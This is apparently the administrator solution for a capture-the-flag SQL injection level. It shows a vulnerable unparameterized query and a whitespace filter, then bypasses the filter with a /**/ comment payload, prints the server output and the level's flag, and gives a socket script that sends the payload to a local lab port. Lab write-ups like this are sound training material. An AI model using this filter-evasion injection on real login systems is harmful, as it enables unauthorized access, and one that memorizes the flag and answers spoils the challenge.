# Level 3: Operator Gatekeeper (WAF Filter) — Administrator Solution & Exploitation Walkthrough
**Case File: EVIDENCE 05 - THE ATTENTION ECONOMY / THE MONEY TRAIL**
**Threat Actor: $CYBERLEEK**

---

## 1. Challenge Specification
* **Domain**: SQL Injection & Web Application Firewall (WAF) Whitespace Evasion
* **Difficulty**: Medium-Hard
* **Estimated Solve Time**: 12–15 minutes
* **Target Endpoint**: `CYBERLEEK-GW> AUTH` / Operator Key ID prompt
* **Target Flag**: `CYBERLEEK{g4t3k33p3r_byp455_4cqu1r3d}`
* **Reference Documents**:
  - `uploads/auth_audit.txt`
  - `uploads/sanitizer_rules.txt`

---

## 2. Vulnerability & WAF Analysis
The Operator Gatekeeper verification routine executes an unparameterized SQL query against `node_operators` in `cyberleek_ledger.db`:

```python
vulnerable_query = (
    "SELECT id, operator_id, handle, clearance_level, role FROM node_operators WHERE operator_id = '"
    + user_input
    + "';"
)
cursor.execute(vulnerable_query)
```

However, the endpoint is protected by an active input filter:
```python
if " " in user_input or "\t" in user_input or "\r" in user_input:
    # WAF VIOLATION: Directive dropped
```

Submitting naive injection strings containing raw spaces (such as `' OR 1=1 --`) results in immediate rejection:
```text
[-] WAF VIOLATION DETECTED: Raw whitespace token rejected by syndicate input filter.
[-] Directive dropped by security gatekeeper.
```

### Evasion & Injection Mechanics:
Under SQLite syntax, SQL block comments (`/**/`) are valid token separators that the SQL parser treats identically to whitespace. By substituting all spaces with `/**/`, the input passes the WAF filter without containing any raw space bytes (`0x20`).

Injected Payload:
```text
'/**/OR/**/1=1/**/--
```

Executed SQL Query:
```sql
SELECT id, operator_id, handle, clearance_level, role 
FROM node_operators 
WHERE operator_id = ''/**/OR/**/1=1/**/--';
```

Evaluation:
1. `operator_id = ''` evaluates to `FALSE`.
2. `OR 1=1` forces the clause to evaluate to `TRUE` for every row in `node_operators`.
3. `--` truncates trailing syntax.
4. The database returns the first row (`OP-0992`, `cyb3r_v4ult_m4st3r`, clearance `4`), confirming authentication bypass and delivering the Level 3 flag.

---

## 3. Step-by-Step Exploitation Walkthrough

### Step 1: Access Operator Gatekeeper Portal
From `CYBERLEEK-GW>`, enter:
```text
AUTH
```

Prompt:
```text
======================================================================
CYBERLEEK OPERATOR GATEKEEPER // CREDENTIAL VERIFICATION (WAF PROTECTED)
======================================================================
Syndicate operator authorization key required.
[!] WAF POLICY: Raw ASCII whitespace (' ') is filtered.
(Type 'BACK' to return to gateway console)

Operator Key ID: 
```

### Step 2: Test WAF Filter
Submitting `' OR 1=1 --` triggers the WAF rejection.

### Step 3: Inject Comment-Substituted Payload
Enter:
```text
'/**/OR/**/1=1/**/--
```

Response:
```text
======================================================================
[+] OPERATOR KEY VERIFIED: cyb3r_v4ult_m4st3r (OP-0992)
[+] CLEARANCE LEVEL: 4 | ROLE: Lead Escrow Broker
[+] GATEKEEPER AUTHENTICATION BYPASS CONFIRMED!
[+] LEVEL 3 FLAG: CYBERLEEK{g4t3k33p3r_byp455_4cqu1r3d}
======================================================================
[+] Redirecting to Escrow Ledger Query Interface...
```

Milestone Flag: `CYBERLEEK{g4t3k33p3r_byp455_4cqu1r3d}`.

---

## 4. Standalone Automated Verification Script

Save as `verify_level3.py` and run against the target:

```python
#!/usr/bin/env python3
import socket

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 9042
EXPECTED_FLAG = "CYBERLEEK{g4t3k33p3r_byp455_4cqu1r3d}"

def verify():
    print(f"[*] Connecting to {TARGET_HOST}:{TARGET_PORT}...")
    with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=5.0) as s:
        # Handshake
        s.recv(4096)
        s.sendall(b"INIT_TRANSACTION_SESSION\n")

        buf = ""
        while "CYBERLEEK-GW>" not in buf:
            chunk = s.recv(1024).decode("utf-8")
            if not chunk:
                break
            buf += chunk

        # Enter AUTH gateway
        print("[*] Entering AUTH gateway...")
        s.sendall(b"AUTH\n")

        while "Operator Key ID:" not in buf:
            chunk = s.recv(1024).decode("utf-8")
            if not chunk:
                break
            buf += chunk

        # Inject comment-based WAF evasion payload
        payload = b"'/**/OR/**/1=1/**/--\n"
        print(f"[*] Dispatching WAF evasion payload: {payload.decode().strip()}")
        s.sendall(payload)

        resp = ""
        while EXPECTED_FLAG not in resp:
            chunk = s.recv(1024).decode("utf-8")
            if not chunk:
                break
            resp += chunk

        assert EXPECTED_FLAG in resp, f"Expected flag {EXPECTED_FLAG} not found in response."
        print(f"[+] SUCCESS: Extracted Level 3 Flag: {EXPECTED_FLAG}")

if __name__ == "__main__":
    verify()
```
